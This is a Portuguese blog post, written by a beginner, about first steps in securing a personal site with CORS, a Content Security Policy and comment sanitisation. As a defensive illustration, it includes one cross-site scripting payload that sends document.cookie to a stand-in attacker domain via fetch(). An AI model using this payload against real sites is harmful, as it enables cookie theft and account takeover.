#html
  #card-title Meus primeiros passos em cibersegurança

    #p Cibersegurança. Pode não ser chamativa, mas se alguns hackers novatos conseguirem invadir, onde fica minha credibilidade?

    #p Minhas primeiras preocupações foram:

    #ul
      #li CORS (Compartilhamento de Recursos entre Origens Diferentes)
      #li CSP (Política de Segurança de Conteúdo)
      #li Saneamento de Entrada (Front-end): controle de entrada do usuário no front-end
      #li Saneamento de Entrada (Back-end): controle de entrada do usuário no back-end

    #p Compartilhamento de Recursos entre Origens Diferentes (CORS)

    #p CORS, em resumo, refere-se a um conjunto de configurações de cabeçalho que um servidor usa para informar ao navegador quais origens têm permissão para carregar seus recursos.

    #p Por exemplo, se um domínio como randomDomain.net tentar acessar a API de um servidor, mas a política de CORS do servidor permitir apenas SpecificDomain.net, o navegador do usuário bloqueará a solicitação.

    #p Isso foi uma preocupação para meu servidor de API. A ideia era configurar o CORS para que apenas meu domínio pudesse acessar meus endpoints de API. No entanto, como estou usando o Google Apps Script como meu servidor de API — e o Google impõe suas próprias políticas de CORS que não posso modificar — não havia muito o que eu pudesse fazer.

    #p Meu domínio nem conseguia fazer solicitações POST — apenas GET — porque as restrições de CORS do Google as bloqueavam. Expliquei como contornei esse problema no post anterior.

  #card-title Política de Segurança de Conteúdo (CSP)

    #p CSP é um conjunto de regras que um site envia ao navegador, informando o que o código do site tem permissão — e não tem permissão — para fazer. Atua como um guarda de segurança, impondo restrições aos scripts e outros recursos.

    #p À primeira vista, pode parecer estranho restringir seu próprio código. Afinal, se você confia no seu código, por que limitá-lo? Mas o objetivo não é se proteger de si mesmo — é proteger os usuários caso alguém consiga injetar código malicioso em seu site.

    #p Para meu site, a vulnerabilidade mais óbvia é a seção de comentários (mais sobre isso depois). Se alguém conseguir inserir código malicioso em um comentário, o CSP pode ajudar a impedir que esse código cause danos sérios, bloqueando certas ações — como executar scripts inline ou enviar dados para domínios suspeitos.

    #p Meu CSP:

    #gray-code 
      #< /*
      #<  Content-Security-Policy: 
      #<    default-src 'self';
      #<    style-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
      #<    script-src 'self' https://cdn.jsdelivr.net;
      #<    font-src 'self' https://fonts.googleapis.com;

    #ul
      #li
        #code default-src 'self'
        #_ : Por padrão, todos os recursos devem vir do próprio servidor do domínio.
      #li 
        #code style-src
        #_ : As folhas de estilo (por exemplo, arquivos CSS) devem vir do servidor do domínio ou dos domínios especificados.
      #li
        #code script-src
        #_ : Os arquivos de script (por exemplo, arquivos JS) devem vir do servidor do domínio ou dos domínios especificados.
      #li
        #code font-src
        #_ : As fontes devem vir do servidor do domínio ou dos domínios especificados.

    #p Qualquer recurso não especificado aqui se enquadra na regra default-src.

    #p Nota: cdn.jsdelivr.net é o domínio que fornece o framework Bootstrap para minha página.

    #p Minha primeira versão do CSP incluía apenas a política default-src 'self'. Como resultado, meu site carregava apenas recursos de seu próprio domínio, bloqueando outras coisas como o Bootstrap.

    #p Usando as ferramentas de desenvolvedor, consegui ver exatamente o que meu navegador estava bloqueando e de quais domínios. Após alguma inspeção, adicionei os domínios importantes às minhas políticas de CSP.

  #card-p Em retrospecto, talvez bloquear caracteres tenha sido exagero. Bem, melhor prevenir do que remediar... mas acho que vou remover esse bloqueio em um commit futuro.

    #h2 Saneamento de Entrada do Usuário

    #p Seus usuários podem nem sempre escrever para você com as melhores intenções. Eles não apenas podem enviar uma mensagem desagradável, mas também podem incluir um pedaço de código malicioso.

    #p Imagine se alguém escreve um comentário em meu blog que inclui uma tag HTML contendo código JavaScript. Esse comentário será exibido como parte da página do meu blog. Um navegador pode potencialmente interpretar esse comentário como código adicional do front-end a ser executado — e é aí que reside o perigo.

    #p Veja o código abaixo. Note que um comentário foi adicionado a uma seção de comentários usando innerHTML:

    #js-code
      #< const commentSection = document.getElementById("commentSection");
      #< commentSection.innerHTML += `<div>"${comment}"</div>`;

    #p E se o conteúdo do comentário for:

    #gray-code
      #< <script>fetch('https://attackerDomain5050.com?c=' + document.cookie)</script>

    #p Neste caso, qualquer usuário que acessar uma página com esse comentário corre o risco de ter seus cookies roubados. Como o conteúdo é inserido via innerHTML, o navegador o interpreta como código do front-end executável. Este é apenas um exemplo de muitas ameaças possíveis.

    #p É por isso que agora exibo comentários em minha página usando esta abordagem:

    #js-code
      #< const commentElement = document.createElement("div");
      #< commentElement.textContent = comment;
      #< const commentSection = document.getElementById("commentSection");
      #< commentSection.appendChild(commentElement);

    #p Ao usar textContent, mesmo que o comentário inclua código, o navegador o trata como texto simples, impedindo a execução de scripts maliciosos.

